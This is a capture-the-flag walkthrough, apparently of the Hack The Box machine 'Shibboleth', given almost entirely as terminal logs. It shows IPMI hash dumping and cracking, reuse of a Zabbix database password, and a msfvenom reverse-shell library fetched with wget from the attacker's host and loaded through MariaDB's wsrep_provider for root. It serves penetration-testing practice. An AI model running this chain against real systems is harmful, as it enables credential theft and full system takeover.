## Nmap Scan

### Nmap 7.92 scan initiated Sun Dec  5 09:50:46 2021 as: nmap -sC -sV -A -T4 -oN nmap.txt 10.129.228.134
Nmap scan report for 10.129.228.134
Host is up (0.16s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/5%OT=80%CT=1%CU=34455%PV=Y%DS=2%DC=T%G=Y%TM=61AC3E3
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 2 hops
Service Info: Host: shibboleth.htb

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   176.45 ms 10.10.14.1
2   176.56 ms 10.129.228.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
### Nmap done at Sun Dec  5 09:51:12 2021 -- 1 IP address (1 host up) scanned in 26.09 seconds

## UDP Scan
nmap -sC -sV -A -sU -T4 10.129.228.134 -oN nmap.txt                                                                                               
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 10:21 IST
Warning: 10.129.228.134 giving up on port because retransmission cap hit (6).
Stats: 0:12:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 80.20% done; ETC: 10:37 (0:03:05 remaining)
Stats: 0:16:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 10:37 (0:00:00 remaining)
Nmap scan report for shibboleth.htb (10.129.228.134)
Host is up (0.18s latency).
Not shown: 986 closed udp ports (port-unreach)
PORT      STATE         SERVICE         VERSION
623/udp   open          asf-rmcp
1100/udp  open|filtered mctp
20120/udp open|filtered unknown
32776/udp open|filtered sometimes-rpc16
34758/udp open|filtered unknown
38615/udp open|filtered unknown
42639/udp open|filtered unknown
43195/udp open|filtered unknown
44923/udp open|filtered unknown
49180/udp open|filtered unknown
51690/udp open|filtered unknown
54114/udp open|filtered unknown
54807/udp open|filtered unknown
58640/udp open|filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.92%I=7%D=12/5%Time=61AC4942%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   195.35 ms 10.10.14.1
2   195.49 ms shibboleth.htb (10.129.228.134)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1090.04 seconds

![image](https://user-images.githubusercontent.com/63084488/144736550-0fc4eec2-6925-47d9-b6b4-1416466f4823.png)

> Zabbix is an open-source monitoring software tool for diverse IT components,including networks, servers, virtual machines and cloud services. BMC (BaseBoardManagement Controller, it monitors the physical state of a computer, networkserver or other hardware device using sensors and communicating with the systemadministrator through an independent connection.


## Finding Vhosts using wfuzz

wfuzz -H "Host: FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 290 --hc 302 http://shibboleth.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000099:   200        29 L     219 W      3684 Ch     "monitor"                                                                                                                  
000000346:   200        29 L     219 W      3684 Ch     "monitoring"                                                                                                               
000000390:   200        29 L     219 W      3684 Ch     "zabbix"                                                                                                                   

Total time: 88.22547
Processed Requests: 4989
Filtered Requests: 4986
Requests/sec.: 56.54829


msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show actions

Auxiliary actions:

   Name  Description
   ----  -----------


msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                                                                                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS shibboleth.htb
RHOSTS => shibboleth.htb
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set threads 10
threads => 10
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                shibboleth.htb                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               10                                                                 yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.228.134:623 - IPMI - Hash found: Administrator:5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd88ff2ec56657f8fb461961e0bd8a1ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:828b49d276eb4edfc57cbebdd63a8e89c9765a41
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) 





hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 11.4)
====================
* Device #1: NVIDIA GeForce GTX 1650, 3856/3911 MB, 14MCU

OpenCL API (OpenCL 3.0 CUDA 11.4.158) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: NVIDIA GeForce GTX 1650, skipped

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================
* Device #3: pthread-AMD Ryzen 7 4800H with Radeon Graphics, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 309 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd88ff2ec56657f8fb461961e0bd8a1ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:828b49d276eb4edfc57cbebdd63a8e89c9765a41:ilovepumkinpie1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: IPMI2 RAKP HMAC-SHA1
Hash.Target......: 5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd8...765a41
Time.Started.....: Sun Dec  5 10:58:52 2021 (1 sec)
Time.Estimated...: Sun Dec  5 10:58:53 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5500.2 kH/s (8.98ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8257536/14344385 (57.57%)
Rejected.........: 0/8257536 (0.00%)
Restore.Point....: 7340032/14344385 (51.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ina-123456 -> estampillas
Hardware.Mon.#1..: Temp: 53c Util: 36% Core:1785MHz Mem:5000MHz Bus:8

Started: Sun Dec  5 10:58:33 2021
Stopped: Sun Dec  5 10:58:54 2021



nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 50404
bash: cannot set terminal process group (1201): Inappropriate ioctl for device
bash: no job control in this shell

zabbix@shibboleth:/home/ipmi-svc$ grep 'bash' /etc/passwd
grep 'bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
zabbix@shibboleth:/home/ipmi-svc$ su ipmi-svc
su ipmi-svc                                                                                                                                                                                                                                
Password:


id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
ls -la
total 72
drwxr-xr-x  19 root root  4096 Oct 16 16:41 .
drwxr-xr-x  19 root root  4096 Oct 16 16:41 ..
lrwxrwxrwx   1 root root     7 Apr 24  2021 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Nov  8 11:05 boot
drwxr-xr-x  17 root root  3860 Dec  5 04:19 dev
drwxr-xr-x  96 root root  4096 Nov  8 11:02 etc
drwxr-xr-x   3 root root  4096 Oct 16 12:24 home
lrwxrwxrwx   1 root root     7 Apr 24  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 24  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 24  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 24  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 24  2021 lost+found
drwxr-xr-x   3 root root  4096 Apr 24  2021 media
drwxr-xr-x   2 root root  4096 Apr 27  2021 mnt
drwxr-xr-x   2 root root  4096 Apr 27  2021 opt
dr-xr-xr-x 430 root root     0 Dec  5 04:18 proc
drwx------   5 root root  4096 Dec  5 04:20 root
drwxr-xr-x  25 root root   800 Dec  5 04:19 run
lrwxrwxrwx   1 root root     8 Apr 24  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Oct 16 13:24 snap
drwxr-xr-x   2 root root  4096 Jul 31  2020 srv
dr-xr-xr-x  13 root root     0 Dec  5 04:18 sys
drwxrwxrwt  13 root root  4096 Dec  5 06:09 tmp
drwxr-xr-x  15 root root  4096 Apr 24  2021 usr
drwxr-xr-x  15 root root  4096 Apr 24  2021 var
python3 -c 'import pty; pty.spawn("/bin/bash")'
ipmi-svc@shibboleth:/$ grep -iR 'password' /etc/zabbix/ 2>/dev/null
grep -iR 'password' /etc/zabbix/ 2>/dev/null
/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword
/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Database password.
/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Comment this line if no password is used.
/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=
/etc/zabbix/zabbix_server.conf:### Option: DBPassword
/etc/zabbix/zabbix_server.conf:#        Database password.
/etc/zabbix/zabbix_server.conf:#        Comment this line if no password is used.
/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh






ipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbix
mysql -u zabbix -p -D zabbix
Enter password: bloooarskybluh

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1222
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/exploit.so";
SET GLOBAL wsrep_provider="/tmp/exploit.so";
ERROR 1231 (42000): Variable 'wsrep_provider' can't be set to the value of '/tmp/exploit.so'
MariaDB [zabbix]> exit
exit
Bye

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9002 -f elf-so -oexploit.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: exploit.so





ipmi-svc@shibboleth:/$ cd /tmp
cd /tmp
ipmi-svc@shibboleth:/tmp$ wget http://10.10.14.10:800/exploit.so
wget http://10.10.14.10:800/exploit.so
--2021-12-05 06:20:39--  http://10.10.14.10:800/exploit.so
Connecting to 10.10.14.10:800... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘exploit.so’

exploit.so          100%[===================>]     476  --.-KB/s    in 0s      

2021-12-05 06:20:39 (52.3 MB/s) - ‘exploit.so’ saved [476/476]

ipmi-svc@shibboleth:/tmp$ mysql -u zabbix -p -D zabbix
mysql -u zabbix -p -D zabbix
Enter password: bloooarskybluh

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1365
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/exploit.so";
SET GLOBAL wsrep_provider="/tmp/exploit.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
MariaDB [zabbix]>




 nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 58602
ls
aria_log.00000001
aria_log_control
debian-10.3.flag
ib_buffer_pool
ib_logfile0
ib_logfile1
ibdata1
ibtmp1
multi-master.info
mysql
mysql_upgrade_info
performance_schema
tc.log
zabbix
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@shibboleth:/var/lib/mysql# cd
cd
bash: cd: HOME not set
root@shibboleth:/var/lib/mysql# cd / 
cd /
root@shibboleth:/# ls -la
ls -la
total 72
drwxr-xr-x  19 root root  4096 Oct 16 16:41 .
drwxr-xr-x  19 root root  4096 Oct 16 16:41 ..
lrwxrwxrwx   1 root root     7 Apr 24  2021 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Nov  8 11:05 boot
drwxr-xr-x  17 root root  3860 Dec  5 04:19 dev
drwxr-xr-x  96 root root  4096 Nov  8 11:02 etc
drwxr-xr-x   3 root root  4096 Oct 16 12:24 home
lrwxrwxrwx   1 root root     7 Apr 24  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 24  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 24  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 24  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 24  2021 lost+found
drwxr-xr-x   3 root root  4096 Apr 24  2021 media
drwxr-xr-x   2 root root  4096 Apr 27  2021 mnt
drwxr-xr-x   2 root root  4096 Apr 27  2021 opt
dr-xr-xr-x 434 root root     0 Dec  5 04:18 proc
drwx------   5 root root  4096 Dec  5 04:20 root
drwxr-xr-x  25 root root   800 Dec  5 04:19 run
lrwxrwxrwx   1 root root     8 Apr 24  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Oct 16 13:24 snap
drwxr-xr-x   2 root root  4096 Jul 31  2020 srv
dr-xr-xr-x  13 root root     0 Dec  5 04:18 sys
drwxrwxrwt  13 root root  4096 Dec  5 06:21 tmp
drwxr-xr-x  15 root root  4096 Apr 24  2021 usr
drwxr-xr-x  15 root root  4096 Apr 24  2021 var
root@shibboleth:/# cat user.txt
cat user.txt
cat: user.txt: No such file or directory
root@shibboleth:/# locate user.txt
locate user.txt
locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 51.0 days)
/home/ipmi-svc/user.txt
root@shibboleth:/# cat /home/ipmi-svc/user.txt
cat /home/ipmi-svc/user.txt
25cff31500e68320043ddfad4f116972
root@shibboleth:/# ls -la
ls -la
total 72
drwxr-xr-x  19 root root  4096 Oct 16 16:41 .
drwxr-xr-x  19 root root  4096 Oct 16 16:41 ..
lrwxrwxrwx   1 root root     7 Apr 24  2021 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Nov  8 11:05 boot
drwxr-xr-x  17 root root  3860 Dec  5 04:19 dev
drwxr-xr-x  96 root root  4096 Nov  8 11:02 etc
drwxr-xr-x   3 root root  4096 Oct 16 12:24 home
lrwxrwxrwx   1 root root     7 Apr 24  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 24  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 24  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 24  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 24  2021 lost+found
drwxr-xr-x   3 root root  4096 Apr 24  2021 media
drwxr-xr-x   2 root root  4096 Apr 27  2021 mnt
drwxr-xr-x   2 root root  4096 Apr 27  2021 opt
dr-xr-xr-x 417 root root     0 Dec  5 04:18 proc
drwx------   5 root root  4096 Dec  5 04:20 root
drwxr-xr-x  25 root root   800 Dec  5 04:19 run
lrwxrwxrwx   1 root root     8 Apr 24  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Oct 16 13:24 snap
drwxr-xr-x   2 root root  4096 Jul 31  2020 srv
dr-xr-xr-x  13 root root     0 Dec  5 04:18 sys
drwxrwxrwt  13 root root  4096 Dec  5 06:22 tmp
drwxr-xr-x  15 root root  4096 Apr 24  2021 usr
drwxr-xr-x  15 root root  4096 Apr 24  2021 var
root@shibboleth:/# cd /home
cd /home
root@shibboleth:/home# ls -la
ls -la
total 12
drwxr-xr-x  3 root     root     4096 Oct 16 12:24 .
drwxr-xr-x 19 root     root     4096 Oct 16 16:41 ..
drwxr-xr-x  3 ipmi-svc ipmi-svc 4096 Dec  5 04:20 ipmi-svc
root@shibboleth:/home# cd /
cd /
root@shibboleth:/# ls
ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
root@shibboleth:/# cd root
cd root
root@shibboleth:/root# ls -la
ls -la
total 36
drwx------  5 root root 4096 Dec  5 04:20 .
drwxr-xr-x 19 root root 4096 Oct 16 16:41 ..
lrwxrwxrwx  1 root root    9 Apr 27  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3115 May 25  2021 .bashrc
drwx------  2 root root 4096 May 12  2021 .cache
drwx------  4 root root 4096 Oct 21 18:39 .config
lrwxrwxrwx  1 root root    9 Apr 28  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   22 Apr 24  2021 .vimrc
-r--------  1 root root   33 Dec  5 04:20 root.txt
drwx------  2 root root 4096 Oct 18 15:36 scripts
root@shibboleth:/root# cat root.txt
cat root.txt
34d1ed3260134b1dd983a6db6c174e88
